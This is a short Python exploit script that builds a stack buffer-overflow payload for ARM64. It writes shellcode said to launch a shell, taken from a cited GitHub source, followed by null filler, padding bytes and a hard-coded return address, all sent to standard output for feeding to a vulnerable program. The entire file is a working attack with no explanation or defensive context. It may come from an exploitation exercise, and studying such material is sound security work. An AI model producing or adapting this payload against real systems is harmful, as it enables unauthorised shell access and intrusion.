import sys
import struct

# launches a shell

# Author: Ken Kitahara
# Source: https://github.com/maxcompston/arm64_shellcode/blob/master/shell-code-mapped/sc_mapped.c
shellcode = b'\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4'

filler   = bytes('\x00' * (64 - len(shellcode)), 'latin1')
padding1 = bytes('\x61' * 8, 'ascii')
padding2 = bytes('\x62' * 8, 'ascii')
padding3 = bytes('\x63' * 8, 'ascii')
padding4 = bytes('\x64' * 8, 'ascii')
padding5 = bytes('\x65' * 8, 'ascii')
retaddr  = struct.pack('P', 0x7fffffe530)

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(filler)
sys.stdout.buffer.write(padding1)
sys.stdout.buffer.write(padding2)
sys.stdout.buffer.write(padding3)
sys.stdout.buffer.write(retaddr)
